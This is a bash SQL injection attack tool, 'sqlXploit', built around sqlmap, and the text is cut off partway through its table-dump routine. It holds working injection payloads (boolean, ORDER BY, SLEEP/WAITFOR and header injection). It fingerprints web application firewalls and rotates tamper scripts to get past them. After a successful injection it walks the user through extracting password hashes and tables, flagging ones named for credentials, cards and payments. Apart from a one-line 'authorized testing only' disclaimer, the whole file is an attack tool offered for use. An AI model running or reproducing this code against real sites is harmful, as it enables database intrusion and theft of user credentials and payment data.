#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  sqlXploit v9.1 — SQLi ONLY | SMART MODE | Clean Build
#  sqlmap flags: --technique --level=2 --risk=1 --threads=3
#                --timeout=15 --retries=2 --time-sec=8
#                --batch --random-agent --smart
# ═══════════════════════════════════════════════════════════════════

set -uo pipefail

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
B='\033[1;34m'; C='\033[1;36m'; M='\033[1;35m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# ─────────────────────────────────────────────
#  LOG FUNCTIONS
# ─────────────────────────────────────────────
LOG_FILE=""
log()    { echo -e "$*"; [[ -n "$LOG_FILE" && -f "$LOG_FILE" ]] && echo -e "$*" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG_FILE"; }
info()   { log "${B}[*]${NC} $*"; }
ok()     { log "${G}[✓]${NC} $*"; }
warn()   { log "${Y}[!]${NC} $*"; }
err()    { log "${R}[✗]${NC} $*"; }
intel()  { log "${C}[INTEL]${NC} $*"; }
auto()   { log "${M}[AUTO] ${NC} $*"; }
adapt()  { log "${Y}[ADAPT]${NC} $*"; }
hit()    { log "${R}${BOLD}[HIT!]${NC}  $*"; }
step()   { log "${G}[STEP] ${NC} $*"; }
spd()    { log "${M}[SPEED]${NC} $*"; }
sep()    { log "${M} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }
timer()  { log "${Y}[TIME] ${NC} $*"; }
ask()    { local r; read -rp "$(echo -e "${C}$1${NC} ")" r </dev/tty; echo "${r:-}"; }
iask()   { local r; printf "${C}%s${NC}" "$1" >&2; read -r r </dev/tty 2>/dev/null; echo "${r:-${2:-}}"; }
iask_yn(){
  local prompt="$1" default="${2:-y}"
  local a
  printf "${C}%s [y/n] (%s): ${NC}" "$prompt" "$default" >&2
  read -r a </dev/tty 2>/dev/null || a="$default"
  a="${a:-$default}"
  [[ "${a,,}" =~ ^y ]]
}

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
banner() {
  clear
  echo -e "${R}${BOLD}"
  cat << 'BANNER'
  ██████╗  ██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
 ██╔════╝ ██╔═══██╗██║     ██║ ██╔╝██║  ██║██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
 ╚█████╗  ██║   ██║██║     █████╔╝ ███████║██████╔╝██║     ██║   ██║██║   ██║
  ╚═══██╗ ██║▄▄ ██║██║     ██╔═██╗ ██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║
 ██████╔╝ ╚██████╔╝███████╗██║  ██╗██║  ██║██║     ███████╗╚██████╔╝██║   ██║
 ╚═════╝   ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
BANNER
  echo -e "${NC}"
  echo -e "${C}   ⚡ v9.1 — SQLi ONLY | SMART Mode | Speed First ⚡${NC}"
  echo -e "${Y}           Developed by: TehanG07  |  www.cyberi.in${NC}"
  echo -e "${M} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

banner
echo -e "${R}[!] LEGAL:${NC} Authorized testing only. You are fully responsible.\n"

# ─────────────────────────────────────────────
#  DEPENDENCY CHECK
# ─────────────────────────────────────────────
sep
info "Checking dependencies..."
for dep in sqlmap curl python3; do
  command -v "$dep" >/dev/null 2>&1 || {
    warn "Installing $dep..."
    sudo apt-get install -y "$dep" >/dev/null 2>&1 || { err "Cannot install $dep."; exit 1; }
  }
done
SQLMAP_VER=$(sqlmap --version 2>/dev/null | grep -oP '\d+\.\d+[\.\d]*' | head -1 || echo "unknown")
ok "sqlmap ${SQLMAP_VER} ready"
sep

# ─────────────────────────────────────────────
#  FILTERS
# ─────────────────────────────────────────────
STATIC_EXCL='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|zip|rar|7z|tar|gz|bz2|br|map)(\?|$)'
AGGR_EXCL='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|zip|rar|7z|tar|gz|bz2|br|map|html?|xml|txt|pdf)(\?|$)'

# ─────────────────────────────────────────────
#  INPUT MODE
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Input Mode${NC}"
echo -e "  ${G}1${NC}) Single URL"
echo -e "  ${G}2${NC}) URL list file"
echo -e "  ${G}3${NC}) Burp/ZAP request file"
mode=$(ask "Choose [1/2/3]:")
input_url=""; targets_file=""; burp_file=""
case "$mode" in
  1) input_url=$(ask "Target URL (with param e.g. ?id=1):")
     [[ -z "$input_url" ]] && { err "URL required."; exit 1; } ;;
  2) fp=$(ask "URL list file path:"); [[ -f "$fp" ]] || { err "File not found."; exit 1; }
     echo -e "  ${G}1${NC}) Conservative  ${G}2${NC}) Aggressive"
     fm=$(ask "Filter [1/2]:"); tmp="$(mktemp)"
     [[ "$fm" == "2" ]] && grep -Eiv "$AGGR_EXCL"   "$fp" | sed '/^\s*$/d' > "$tmp" \
                        || grep -Eiv "$STATIC_EXCL" "$fp" | sed '/^\s*$/d' > "$tmp"
     [[ -s "$tmp" ]] || { err "No targets after filter."; exit 1; }
     targets_file="$tmp"; ok "$(wc -l < "$tmp") targets queued." ;;
  3) burp_file=$(ask "Burp request file:"); [[ -f "$burp_file" ]] || { err "File not found."; exit 1; }
     ok "Request file loaded." ;;
  *) err "Invalid choice."; exit 1 ;;
esac

# ─────────────────────────────────────────────
#  FIXED SMART MODE — no menu
# ─────────────────────────────────────────────
MODE_NAME="SMART"
SQLMAP_LEVEL=2
SQLMAP_RISK=1
SQLMAP_THREADS=3
TIME_SEC=8
DO_TIME_BASED=true
SQLI_TIMEOUT=480
ok "Mode: ${MODE_NAME} | Level:${SQLMAP_LEVEL} | Risk:${SQLMAP_RISK} | Threads:${SQLMAP_THREADS}"

# ─────────────────────────────────────────────
#  SESSION / AUTH
# ─────────────────────────────────────────────
sep
echo -e "${BOLD}[2] Session / Auth${NC} ${DIM}(Enter to skip each)${NC}"
CK_VAL=""; COOKIE_OPT=""; HEADER_OPT=""; PROXY_OPT=""
CK_VAL=$(ask "Cookie (Enter to skip):")
[[ -n "$CK_VAL" ]] && COOKIE_OPT="--cookie=${CK_VAL}"
HD_VAL=$(ask "Custom header e.g. Authorization: Bearer xyz (Enter to skip):")
[[ -n "${HD_VAL:-}" ]] && HEADER_OPT="--headers=${HD_VAL}"
PX_VAL=$(ask "Proxy e.g. http://127.0.0.1:8080 (Enter to skip):")
[[ -n "${PX_VAL:-}" ]] && PROXY_OPT="--proxy=${PX_VAL}"

# ─────────────────────────────────────────────
#  OUTPUT DIR
# ─────────────────────────────────────────────
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_DIR="sqlxploit_${TIMESTAMP}"
mkdir -p "$LOG_DIR"
LOG_FILE="${LOG_DIR}/full_log.txt"
HITS_FILE="${LOG_DIR}/confirmed.txt"
INTEL_FILE="${LOG_DIR}/intel.txt"
BLOCK_LOG="${LOG_DIR}/blocks.txt"
DUMP_DIR="${LOG_DIR}/dumps"
mkdir -p "$DUMP_DIR"
: > "$LOG_FILE"; : > "$HITS_FILE"; : > "$INTEL_FILE"; : > "$BLOCK_LOG"

# ─────────────────────────────────────────────
#  TIMING
# ─────────────────────────────────────────────
SCAN_START=$(date +%s)
elapsed_since_start() { echo $(( $(date +%s) - SCAN_START )); }

# ─────────────────────────────────────────────
#  SANITIZER — hides sqlmap branding
# ─────────────────────────────────────────────
sanitize_output() {
  sed -e 's/sqlmap/sqlXploit/Ig' \
      -e '/^        ___/d' -e '/^       __H__/d' -e '/^ ___ ___/d' \
      -e '/^|___|/d' -e '/^|_ -|/d' -e '/^      |_|/d' -e '/sqlmap\.org/d'
}

# ─────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────
BLOCK_COUNT=0
CURRENT_THREADS=$SQLMAP_THREADS
MAX_BLOCK_RETRIES=3
BASELINE_TIME=0
BASELINE_SIZE=0
WAF_NAME=""
DETECTED_TECHNIQUE=""
SQLI_FOUND=false
CURRENT_TAMPER=""
CURRENT_DELAY=0
TAMPER_INDEX=0

TAMPER_POOL=(
  "space2comment,between,randomcase"
  "space2comment,randomcase,charencode"
  "space2comment,charunicodeencode,between"
  "space2plus,randomcase,between,charencode"
  "space2comment,randomcase,equaltolike,between"
  "versionedkeywords,space2comment,randomcase"
  "modsecurityversioned,space2comment,randomcase"
  "space2comment,randomcase,charunicodeencode,versionedkeywords"
)

# ─────────────────────────────────────────────
#  CURL HELPERS
# ─────────────────────────────────────────────
do_curl() {
  local url="$1"; shift
  curl -s --max-time 12 -L \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122 Safari/537.36" \
    ${CK_VAL:+--cookie "${CK_VAL}"} \
    "$@" "$url" 2>/dev/null || echo ""
}

do_head() {
  curl -sI --max-time 8 -L -A "Mozilla/5.0" "$1" 2>/dev/null \
    | tr '[:upper:]' '[:lower:]' || echo ""
}

http_code() {
  curl -o /dev/null -s -w "%{http_code}" --max-time 6 "$1" 2>/dev/null || echo "000"
}

declare -A PCURL_PIDS
declare -A PCURL_FILES

pcurl_start() {
  local label="$1" url="$2"; shift 2
  local tmpf; tmpf=$(mktemp /tmp/pcurl.XXXXXX)
  PCURL_FILES["$label"]="$tmpf"
  ( do_curl "$url" "$@" > "$tmpf" 2>/dev/null ) &
  PCURL_PIDS["$label"]=$!
}

pcurl_wait() {
  local label="$1"
  local pid="${PCURL_PIDS[$label]:-}"
  [[ -n "$pid" ]] && wait "$pid" 2>/dev/null || true
  local f="${PCURL_FILES[$label]:-}"
  [[ -f "$f" ]] && cat "$f" && rm -f "$f" || echo ""
  unset "PCURL_PIDS[$label]" "PCURL_FILES[$label]"
}

pcurl_waitall() {
  for label in "${!PCURL_PIDS[@]}"; do
    local pid="${PCURL_PIDS[$label]}"
    wait "$pid" 2>/dev/null || true
    unset "PCURL_PIDS[$label]"
  done
}

# ═══════════════════════════════════════════════════════════════
#  FAST BASELINE — 2 requests
# ═══════════════════════════════════════════════════════════════
capture_baseline() {
  local url="$1"
  info "Fast baseline (2 requests)..."
  local times=() sizes=()
  local i t_s t_e body el
  for i in 1 2; do
    t_s=$(date +%s%N)
    body=$(do_curl "$url")
    t_e=$(date +%s%N)
    el=$(( (t_e - t_s) / 1000000 ))
    times+=("$el")
    sizes+=(${#body})
    sleep 0.2
  done
  BASELINE_TIME=$(( (times[0] + times[1]) / 2 ))
  BASELINE_SIZE=$(( (sizes[0] + sizes[1]) / 2 ))
  intel "Baseline: ${BASELINE_TIME}ms | size: ${BASELINE_SIZE}B"
  echo "BASELINE: ${BASELINE_TIME}ms ${BASELINE_SIZE}B" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  WAF FINGERPRINT
# ═══════════════════════════════════════════════════════════════
fingerprint_target() {
  local url="$1"
  sep; info "WAF Fingerprinting..."
  local headers; headers=$(do_head "$url")
  WAF_NAME=""

  if   echo "$headers" | grep -q "cf-ray\|cloudflare";              then WAF_NAME="cloudflare"
  elif echo "$headers" | grep -q "x-akamai\|akamaighost";           then WAF_NAME="akamai"
  elif echo "$headers" | grep -q "x-amzn-requestid\|awselb";        then WAF_NAME="aws"
  elif echo "$headers" | grep -q "x-iinfo\|incap_ses\|visid_incap"; then WAF_NAME="imperva"
  elif echo "$headers" | grep -q "x-sucuri-id";                     then WAF_NAME="sucuri"
  elif echo "$headers" | grep -q "bigipserver\|f5-";                then WAF_NAME="f5"
  elif echo "$headers" | grep -q "barracuda";                       then WAF_NAME="barracuda"
  fi

  if [[ -z "$WAF_NAME" ]]; then
    local wsc; wsc=$(http_code "${url}%27%20OR%201%3D1--%20-")
    [[ "$wsc" =~ ^(403|406|418|501|999)$ ]] && WAF_NAME="generic"
  fi

  case "$WAF_NAME" in
    cloudflare)   CURRENT_TAMPER="space2comment,between,randomcase,charencode";              CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    akamai)       CURRENT_TAMPER="space2comment,randomcase,between,charunicodeencode";       CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    aws)          CURRENT_TAMPER="space2comment,randomcase,charunicodeencode,between";       CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    imperva)      CURRENT_TAMPER="space2comment,randomcase,charunicodeencode,multiplespaces"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    sucuri)       CURRENT_TAMPER="space2comment,randomcase,between,charencode";              CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    f5|barracuda) CURRENT_TAMPER="space2comment,between,randomcase,charencode";              CURRENT_DELAY=1; CURRENT_THREADS=2 ;;
    generic)      CURRENT_TAMPER="space2comment,between,randomcase";                         CURRENT_DELAY=1; CURRENT_THREADS=2 ;;
    "")           CURRENT_TAMPER=""; CURRENT_DELAY=0; CURRENT_THREADS=$SQLMAP_THREADS ;;
  esac

  sep
  log "${C}${BOLD}📊 TARGET INFO${NC}"
  log "  ${B}WAF     :${NC} ${WAF_NAME:-None}"
  log "  ${G}→ delay :${NC} ${CURRENT_DELAY}s | ${G}threads:${NC} ${CURRENT_THREADS} | ${G}tamper:${NC} ${CURRENT_TAMPER:-(none)}"
  sep
  echo "WAF=${WAF_NAME}" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  PRE-SCAN — detect technique before sqlmap runs
# ═══════════════════════════════════════════════════════════════
prescan_technique() {
  local url="$1"
  info "Pre-scan: detecting injectable technique..."
  DETECTED_TECHNIQUE=""
  local signals=()

  # Signal 1: Error-based (1 request)
  local err_body; err_body=$(do_curl "${url}'" | head -c 3000)
  if echo "$err_body" | grep -qiE "you have an error in your sql|warning.*mysql|pg_query|ora-[0-9]{4}|sqlite3|mssql|syntax error.*sql|unclosed quotation|mysql_fetch|ORA-"; then
    signals+=("E")
    intel "Signal: SQL error leaked → E"
  fi

  # Signal 2: Boolean diff (2 parallel requests)
  pcurl_start "bool_true"  "${url}%20AND%201%3D1--%20-"
  pcurl_start "bool_false" "${url}%20AND%201%3D2--%20-"
  local bt bf
  bt=$(pcurl_wait "bool_true")
  bf=$(pcurl_wait "bool_false")
  local bool_diff=$(( ${#bt} > ${#bf} ? ${#bt} - ${#bf} : ${#bf} - ${#bt} ))
  if (( bool_diff > 80 )); then
    signals+=("B")
    intel "Signal: Boolean diff ${bool_diff}B → B"
  fi

  # Signal 3: UNION via ORDER BY
  pcurl_start "ob1"    "${url}%20ORDER%20BY%201--%20-"
  pcurl_start "ob9999" "${url}%20ORDER%20BY%209999--%20-"
  local ob1 ob9
  ob1=$(pcurl_wait "ob1")
  ob9=$(pcurl_wait "ob9999")
  local ob_diff=$(( ${#ob1} > ${#ob9} ? ${#ob1} - ${#ob9} : ${#ob9} - ${#ob1} ))
  if (( ob_diff > 50 )) || echo "$ob9" | grep -qiE "unknown column|ORDER BY position|1054|ORA-01785"; then
    signals+=("U")
    intel "Signal: ORDER BY diff → U"
  fi

  # Signal 4: Time-based (only if nothing else found)
  if $DO_TIME_BASED && (( ${#signals[@]} == 0 )); then
    intel "No fast signals — checking time-based..."
    local t_threshold=$(( BASELINE_TIME + 4500 ))
    local ts te el
    ts=$(date +%s%N)
    do_curl "${url}%27%20AND%20SLEEP(5)--%20-" > /dev/null
    te=$(date +%s%N); el=$(( (te - ts) / 1000000 ))
    if (( el > t_threshold )); then
      signals+=("T"); intel "Signal: Sleep delay ${el}ms → T"
    else
      ts=$(date +%s%N)
      do_curl "${url}%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%20-" > /dev/null
      te=$(date +%s%N); el=$(( (te - ts) / 1000000 ))
      (( el > t_threshold )) && signals+=("T") && intel "MSSQL WAITFOR delay confirmed → T"
    fi
  fi

  # Build final technique string
  if (( ${#signals[@]} == 0 )); then
    DETECTED_TECHNIQUE="BE"
    warn "No signals — fallback: BE"
  else
    local raw_tech
    raw_tech=$(printf '%s' "${signals[@]}" | grep -o . | sort -u | tr -d '\n')
    DETECTED_TECHNIQUE="$raw_tech"
    [[ "$DETECTED_TECHNIQUE" != *B* && "$DETECTED_TECHNIQUE" != *E* ]] && \
      DETECTED_TECHNIQUE="BE${DETECTED_TECHNIQUE}"
    auto "Detected: ${DETECTED_TECHNIQUE}"
  fi

  echo "TECHNIQUE=${DETECTED_TECHNIQUE}" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  HEADER INJECTION QUICK CHECK
# ═══════════════════════════════════════════════════════════════
test_header_injection_fast() {
  local url="$1"
  local payloads=(
    "User-Agent: Mozilla/5.0' AND '1'='1"
    "X-Forwarded-For: 1.1.1.1' AND SLEEP(1)-- -"
    "Referer: ${url}' AND '1'='1"
    "X-Real-IP: 1.1.1.1' AND '1'='1"
  )
  local i=0
  for h in "${payloads[@]}"; do
    pcurl_start "hdr${i}" "$url" -H "$h"; ((i++)) || true
  done
  local j=0
  for h in "${payloads[@]}"; do
    local body; body=$(pcurl_wait "hdr${j}")
    if echo "$body" | grep -qiE "you have an error in your sql|pg_query|ora-[0-9]|mssql"; then
      intel "Header injection hint: ${h%%:*}"
      echo "HEADER_INJECTABLE:${h%%:*}" >> "$INTEL_FILE"
    fi
    ((j++)) || true
  done
}

# ═══════════════════════════════════════════════════════════════
#  BUILD SQLMAP COMMAND
#  10 core flags only + auth (if provided) + WAF tamper/delay
# ═══════════════════════════════════════════════════════════════
build_sqlmap_cmd() {
  local -n _arr="$1"
  local url_arg="$2" technique="$3" \
        level="${4:-$SQLMAP_LEVEL}" \
        risk="${5:-$SQLMAP_RISK}" \
        ts="${6:-$TIME_SEC}"

  _arr=(
    sqlmap
    "--technique=${technique}"
    "--level=${level}"
    "--risk=${risk}"
    "--threads=${CURRENT_THREADS}"
    "--timeout=15"
    "--retries=2"
    "--time-sec=${ts}"
    --batch
    --random-agent
    --smart
  )

  [[ "$url_arg" == -r* ]] && _arr+=( $url_arg ) || _arr+=( -u "$url_arg" )

  # Auth — only added if user provided them at startup
  [[ -n "${COOKIE_OPT:-}" ]] && _arr+=( "${COOKIE_OPT}" )
  [[ -n "${HEADER_OPT:-}" ]] && _arr+=( "${HEADER_OPT}" )
  [[ -n "${PROXY_OPT:-}"  ]] && _arr+=( "${PROXY_OPT}"  )

  # WAF bypass — auto-set by fingerprint, not user flags
  [[ -n "${CURRENT_TAMPER:-}" ]] && _arr+=( "--tamper=${CURRENT_TAMPER}" )
  (( CURRENT_DELAY > 0 ))        && _arr+=( "--delay=${CURRENT_DELAY}" )
}

# ═══════════════════════════════════════════════════════════════
#  PARSERS
# ═══════════════════════════════════════════════════════════════
parse_injection_found() {
  echo "$1" | grep -qiE \
    "parameter '.*' is vulnerable|Type: (boolean|time|error|union|stacked)|back-end DBMS:|injectable"
}

parse_blocked() {
  echo "$1" | grep -qiE \
    "connection refused|403 forbidden|heuristic.*detected|too many requests|waf|firewall|rate.limit"
}

# ═══════════════════════════════════════════════════════════════
#  BLOCK HANDLER — rotate tamper on WAF block
# ═══════════════════════════════════════════════════════════════
handle_block() {
  local reason="$1"
  ((BLOCK_COUNT++)) || true
  adapt "BLOCK #${BLOCK_COUNT} — ${reason}"
  echo "BLOCK #${BLOCK_COUNT}: ${reason}" >> "$BLOCK_LOG"
  (( BLOCK_COUNT >= MAX_BLOCK_RETRIES )) && \
    warn "Max retries reached — skipping phase" && return 1
  local nd=$(( CURRENT_DELAY + 3 ))
  (( nd > 10 )) && nd=10
  CURRENT_DELAY=$nd
  CURRENT_THREADS=1
  TAMPER_INDEX=$(( (TAMPER_INDEX + 1) % ${#TAMPER_POOL[@]} ))
  CURRENT_TAMPER="${TAMPER_POOL[$TAMPER_INDEX]}"
  adapt "→ delay=${CURRENT_DELAY}s | tamper=${CURRENT_TAMPER}"
  sleep $(( CURRENT_DELAY + 1 ))
  return 0
}

# ═══════════════════════════════════════════════════════════════
#  ADAPTIVE SCAN — 2 phases
#  Phase 1: Pre-detected technique, level 1 (fast)
#  Phase 2: BEUS wider, level 2 (if Phase 1 fails)
# ═══════════════════════════════════════════════════════════════
adaptive_scan() {
  local url_arg="$1" probe_url="$2"
  SQLI_FOUND=false

  local ts=$(( BASELINE_TIME / 1000 + TIME_SEC ))
  (( ts < TIME_SEC )) && ts=$TIME_SEC
  (( ts > 20 ))       && ts=20

  # Pre-scan + header check run in parallel before sqlmap
  prescan_technique         "$probe_url" &
  local prescan_pid=$!
  test_header_injection_fast "$probe_url" &
  local header_pid=$!
  wait $prescan_pid; wait $header_pid

  local tech="${DETECTED_TECHNIQUE:-BE}"

  # ── Phase 1: Focused, level 1 ──
  sep
  spd "Phase 1 — technique:${tech} | level:1"
  local cmd1=()
  build_sqlmap_cmd cmd1 "$url_arg" "$tech" 1 1 "$ts"

  local out1 out1_all
  out1=$(timeout "$SQLI_TIMEOUT" "${cmd1[@]}" </dev/null 2>&1 | sanitize_output) || true
  echo "$out1" | tee -a "$LOG_FILE"
  out1_all="$out1"

  if parse_blocked "$out1"; then
    handle_block "Phase1" && {
      local cmd1r=()
      build_sqlmap_cmd cmd1r "$url_arg" "$tech" 1 1 "$ts"
      local out1r
      out1r=$(timeout "$SQLI_TIMEOUT" "${cmd1r[@]}" </dev/null 2>&1 | sanitize_output) || true
      echo "$out1r" | tee -a "$LOG_FILE"
      out1_all="${out1}
${out1r}"
    }
  fi

  if parse_injection_found "$out1_all"; then
    SQLI_FOUND=true
    hit "SQLi FOUND — Phase 1!"
    echo "[SQLI_CONFIRMED] ${probe_url}" >> "$HITS_FILE"
    return
  fi

  # Skip Phase 2 if near budget
  local used; used=$(elapsed_since_start)
  if (( used > SQLI_TIMEOUT * 8 / 10 )); then
    warn "Budget limit — skipping Phase 2"; return
  fi

  # ── Phase 2: Wider, level 2 ──
  sep
  spd "Phase 2 — technique:BEUS | level:${SQLMAP_LEVEL}"
  local cmd2=()
  build_sqlmap_cmd cmd2 "$url_arg" "BEUS" "$SQLMAP_LEVEL" "$SQLMAP_RISK" "$ts"

  local out2 out2_all
  out2=$(timeout "$SQLI_TIMEOUT" "${cmd2[@]}" </dev/null 2>&1 | sanitize_output) || true
  echo "$out2" | tee -a "$LOG_FILE"
  out2_all="$out2"

  if parse_blocked "$out2"; then
    handle_block "Phase2" && {
      local cmd2r=()
      build_sqlmap_cmd cmd2r "$url_arg" "BEUS" "$SQLMAP_LEVEL" "$SQLMAP_RISK" "$ts"
      local out2r
      out2r=$(timeout "$SQLI_TIMEOUT" "${cmd2r[@]}" </dev/null 2>&1 | sanitize_output) || true
      echo "$out2r" | tee -a "$LOG_FILE"
      out2_all="${out2}
${out2r}"
    }
  fi

  if parse_injection_found "$out2_all"; then
    SQLI_FOUND=true
    hit "SQLi FOUND — Phase 2!"
    echo "[SQLI_CONFIRMED] ${probe_url}" >> "$HITS_FILE"
  fi
}

# ═══════════════════════════════════════════════════════════════
#  INTERACTIVE GUIDED DUMP
# ═══════════════════════════════════════════════════════════════
interactive_dump() {
  local url_arg="$1" label="$2"
  sep; hit "INJECTION CONFIRMED — ${label}"; sep

  local ts=$(( BASELINE_TIME / 1000 + TIME_SEC ))
  (( ts < TIME_SEC )) && ts=$TIME_SEC
  (( ts > 20 ))       && ts=20

  local base_arr=()
  build_sqlmap_cmd base_arr "$url_arg" "BEUST" 1 1 "$ts"

  # Step 1: auto get DB info
  sep; step "Fetching current DB / user / DBA..."
  local info_out
  info_out=$( "${base_arr[@]}" --current-db --current-user --is-dba </dev/null 2>&1 | sanitize_output ) || true
  echo "$info_out" | tee -a "$LOG_FILE"

  local cur_db cur_user is_dba
  cur_db=$(  echo "$info_out" | grep -oP "(?i)current database:\s*'?\K[^'\s]+"  | head -1 || echo "")
  cur_user=$(echo "$info_out" | grep -oP "(?i)current user:\s*'?\K[^'\s]+"      | head -1 || echo "")
  is_dba=$(  echo "$info_out" | grep -oiP "(?i)is-dba.*\K(True|False)"          | head -1 || echo "unknown")
  log "  ${G}DB:${NC} ${cur_db:-?}  ${G}User:${NC} ${cur_user:-?}  ${G}DBA:${NC} ${is_dba}"
  echo "[INFO] DB=${cur_db} User=${cur_user} DBA=${is_dba}" >> "$HITS_FILE"

  if echo "$is_dba" | grep -qi "true"; then
    hit "DBA CONFIRMED!"
    iask_yn "  Dump all users + password hashes?" && {
      local pw_out
      pw_out=$( "${base_arr[@]}" --users --passwords </dev/null 2>&1 | sanitize_output ) || true
      echo "$pw_out" | tee -a "$LOG_FILE"
      echo "$pw_out" > "${DUMP_DIR}/users_and_hashes.txt"
      echo "[DUMPED] users_and_hashes" >> "$HITS_FILE"
    }
  fi

  sep
  iask_yn "List all databases?" "y" || {
    [[ -n "$cur_db" ]] && _dump_db "$url_arg" "$label" "$cur_db" "${base_arr[@]}" \
                       || err "No DB found."
    return
  }

  step "Enumerating databases..."
  local dbs_out
  dbs_out=$( "${base_arr[@]}" --dbs </dev/null 2>&1 | sanitize_output ) || true
  echo "$dbs_out" | tee -a "$LOG_FILE"

  local db_list=()
  local in_db_section=false
  while IFS= read -r line; do
    echo "$line" | grep -qi "available databases" && in_db_section=true
    $in_db_section || continue
    # Only match "[*] word" lines — exclude sqlmap timestamp lines like "[*] ending @ 05:07:03"
    echo "$line" | grep -qP '^\[\*\]\s+\S+' || continue
    echo "$line" | grep -qP '^\[\*\]\s+\S+.*@\s*\d{2}:\d{2}' && continue   # skip timestamp lines
    echo "$line" | grep -qP '^\[\*\]\s+starting' && continue                # skip "starting N threads"
    local dn
    dn=$(echo "$line" | grep -oP '(?<=\[\*\]\s)\S+' | head -1)
    [[ -n "$dn" ]] && db_list+=("$dn")
  done <<< "$dbs_out"

  (( ${#db_list[@]} == 0 )) && [[ -n "$cur_db" ]] && db_list+=("$cur_db")
  (( ${#db_list[@]} == 0 )) && { err "No databases found."; return; }

  local skip_p="^(information_schema|performance_schema|mysql|sys|pg_catalog|template0|template1)$"
  local user_dbs=()
  for db in "${db_list[@]}"; do
    echo "$db" | grep -qiE "$skip_p" || user_dbs+=("$db")
  done
  log "  ${C}User DBs:${NC} ${user_dbs[*]:-none}"

  local chosen=()
  if (( ${#user_dbs[@]} == 1 )); then
    chosen=( "${user_dbs[0]}" )
  elif (( ${#user_dbs[@]} > 1 )); then
    log "  ${G}0${NC}) ALL"
    local idx=1
    for db in "${user_dbs[@]}"; do
      log "  ${G}${idx}${NC}) ${db}"; ((idx++)) || true
    done
    local ch; ch=$(iask "  Choice [0=all]: " "0")
    if [[ "$ch" == "0" ]]; then
      chosen=( "${user_dbs[@]}" )
    else
      IFS=',' read -ra ns <<< "$ch"
      for n in "${ns[@]}"; do
        n=$(echo "$n" | tr -d ' ')
        (( n >= 1 && n <= ${#user_dbs[@]} )) && chosen+=( "${user_dbs[$((n-1))]}" )
      done
      (( ${#chosen[@]} == 0 )) && chosen=( "${user_dbs[@]}" )
    fi
  fi

  for db in "${chosen[@]}"; do
    _dump_db "$url_arg" "$label" "$db" "${base_arr[@]}"
  done
  sep; ok "Dump complete → ${DUMP_DIR}/"
}

_dump_db() {
  local url_arg="$1" label="$2" db="$3"; shift 3
  local base_arr=( "$@" )
  sep; log "${C}${BOLD}  DB: ${db}${NC}"
  iask_yn "  List tables in '${db}'?" "y" || { info "Skipping ${db}"; return; }

  step "Tables in ${db}..."
  local tout
  tout=$( "${base_arr[@]}" -D "$db" --tables </dev/null 2>&1 | sanitize_output ) || true
  echo "$tout" | tee -a "$LOG_FILE"

  local tlist=()
  while IFS= read -r line; do
    echo "$line" | grep -qP '^\|\s+\S+\s+\|' && \
      tlist+=( "$(echo "$line" | grep -oP '(?<=\|\s)\S+(?=\s+\|)' | head -1)" )
  done <<< "$tout"
  (( ${#tlist[@]} == 0 )) && { warn "No tables in ${db}"; return; }

  local idx=1
  for tb in "${tlist[@]}"; do
    local f=""
    echo "$tb" | grep -qiE "user|admin|pass|cred|customer|email|token|secret|auth|payment|card|order" \
      && f=" ${R}★${NC}"
    log "  ${G}${idx}${NC}) ${tb}${f}"
    ((idx++)) || true
  done

  iask_yn "  Dump tables from '${db}'?" "y" || { info "Skipping"; return; }
  log "  ${G}0${NC}) ALL  or numbers/names comma-separated"
  local ch; ch=$(iask "  Choice: " "0")

  local chosen=()
  if [[ "$ch" == "0" ]]; then
    chosen=( "${tlist[@]}" )
  elif echo "$ch" | grep -qP '^\d+(,\d+)*$'; then
    IFS=',' read -ra ns <<< "$ch"
    for n in "${ns[@]}"; do
      n=$(echo "$n" | tr -d ' ')
      (( n >= 1 && n <= ${#tlist[@]} )) && chosen+=( "${tlist[$((n-1))]}" )
    done
  else
    IFS=',' read -ra nms <<< "$ch"
    for nm in "${nms[@]}"; do
      nm=$(echo "$nm" | tr -d ' '); [[ -n "$nm" ]] && chosen+=("$nm")
    done
  fi
  (( ${#chosen[@]} == 0 )) && chosen=( "${tlist[@]}" )

  for tb in "${chosen[@]}"; do
    [[ -z "$tb" ]] && continue
    _dump_table "$url_arg" "$label" "$db" "$tb" "${base_arr[@]}"
  done
}

_dump_table() {
  local url_arg="$1" label="$2" db="$3" tb="$4"; shift 4
  local base_arr=( "$@" )
  sep; log "${C}${BOLD}  TABLE: ${db}.${tb}${NC}"

  step "Columns in ${db}.${tb}..."
  local cout
  cout=$( "${base_arr[@]}" -D "$db" -T "$tb" --columns </dev/null 2>&1 | sanitize_output ) || true
  echo "$cout" | tee -a "$LOG_FILE"

  local col_names=()
